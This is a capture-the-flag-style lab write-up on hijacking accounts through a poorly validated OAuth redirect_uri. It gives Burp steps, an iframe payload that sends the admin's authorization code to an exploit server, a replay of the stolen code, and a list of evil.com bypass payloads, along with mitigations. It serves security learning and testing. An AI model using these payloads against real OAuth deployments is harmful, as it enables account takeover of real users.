# Lab 04 - OAuth Account Hijacking via redirect_uri

## Lab Information

**Difficulty:** Practitioner

**Category**

- OAuth
- Authorization Code Flow
- redirect_uri Validation
- Authorization Code Theft
- Account Takeover

---

# Lab Objective

Steal the administrator's OAuth authorization code by abusing a vulnerable
`redirect_uri`, then use the stolen code to log in as the administrator and
delete Carlos.

---

# Vulnerability

The OAuth Authorization Server fails to properly validate the
`redirect_uri` parameter.

Instead of enforcing a strict allowlist, it accepts attacker-controlled
redirect destinations.

As a result, authorization codes are delivered to attacker-controlled
domains.

---

# Root Cause

OAuth trusts the supplied:

```
redirect_uri
```

without verifying that it exactly matches a registered callback.

Instead of:

```
redirect_uri

↓

Exact Match

↓

Authorized
```

it performs weak validation.

---

# Normal OAuth Flow

```
Victim

↓

OAuth Server

↓

Authorization Code

↓

Client Callback

↓

Token Exchange

↓

Authenticated
```

---

# Vulnerable Flow

```
Victim

↓

OAuth Server

↓

Authorization Code

↓

Attacker Server

↓

Attacker Steals Code

↓

Legitimate Callback

↓

Logged In As Victim
```

---

# Why It Works

Authorization Codes are:

- Short-lived
- Single-use
- Extremely sensitive

If an attacker receives the code before the legitimate client redeems it,
they can complete the OAuth flow themselves.

---

# Burp Analysis

Capture:

```
GET /auth
```

Example:

```http
GET /auth?
client_id=djhi3yre9823ihd
&redirect_uri=https://client.com/oauth-callback
&response_type=code
```

Send to Repeater.

---

# Discovery

Modify:

```
redirect_uri
```

Example:

```
https://exploit-server.net
```

Observe:

OAuth accepts it.

Response:

```
302 Redirect

↓

https://exploit-server.net/?code=xxxxxxxx
```

This confirms authorization code leakage.

---

# Exploitation Steps

## Step 1

Login normally using OAuth.

```
wiener

peter
```

---

## Step 2

Capture:

```
GET /auth
```

---

## Step 3

Send request to Burp Repeater.

---

## Step 4

Replace:

```
redirect_uri
```

with:

```
https://YOUR-EXPLOIT-SERVER.net
```

---

## Step 5

Forward request.

Observe:

```
Authorization Code

↓

Exploit Server
```

---

## Step 6

Create exploit.

```html
<iframe
src="https://oauth-server.net/auth?
client_id=CLIENT_ID
&redirect_uri=https://exploit-server.net
&response_type=code">
</iframe>
```

---

## Step 7

Deliver exploit.

Administrator visits page.

OAuth automatically redirects:

```
Admin

↓

Authorization Code

↓

Exploit Server
```

---

## Step 8

Copy leaked authorization code.

Example

```
code=KJASD8723HJKAS
```

---

## Step 9

Visit

```
https://target.com/oauth-callback?code=KJASD8723HJKAS
```

The application exchanges the code for an access token and creates an
authenticated session.

You are now Administrator.

---

# Complete Attack Chain

```
Victim

↓

OAuth Login

↓

Authorization Code

↓

Attacker Redirect URI

↓

Attacker Receives Code

↓

Legitimate Callback

↓

Authenticated As Victim
```

---

# Why state Does NOT Prevent This

Many developers assume:

```
state

↓

Safe
```

Not necessarily.

The attacker can initiate a completely new OAuth flow using their own
session and obtain a fresh:

```
state

+

Authorization Code
```

The real protection is strict validation of:

```
redirect_uri
```

---

# Detection Checklist

During testing ask:

```
Can redirect_uri Be Modified?

↓

External Domain Allowed?

↓

Partial Match?

↓

Prefix Match?

↓

Suffix Match?

↓

Query Injection?

↓

Fragment Injection?
```

---

# Bug Bounty Tips

Whenever you see:

```
redirect_uri
```

Always test:

```
https://evil.com
```

```
https://trusted.com@evil.com
```

```
https://trusted.com#evil.com
```

```
https://trusted.com/?next=https://evil.com
```

```
localhost.evil.com
```

```
Duplicate redirect_uri Parameters
```

---

# Impact

```
Authorization Code Theft

↓

Authentication Bypass

↓

Account Takeover

↓

Privilege Escalation
```

Usually rated:

```
High

or

Critical
```

---

# Mitigation

OAuth providers should:

- Register approved callback URLs
- Require exact byte-for-byte matching
- Reject unknown domains
- Validate the same `redirect_uri` during the `/token` exchange
- Reject reused authorization codes

---

# Personal Learning

The `redirect_uri` parameter is one of the most critical inputs in any OAuth implementation.

If an attacker can redirect the authorization code to a domain they control, they can often complete the OAuth flow and impersonate the victim without ever knowing the victim's password.

---

# PortSwigger Skills Learned

- Authorization Code Flow
- redirect_uri Testing
- Burp Repeater
- OAuth Code Theft
- Exploit Server
- Account Takeover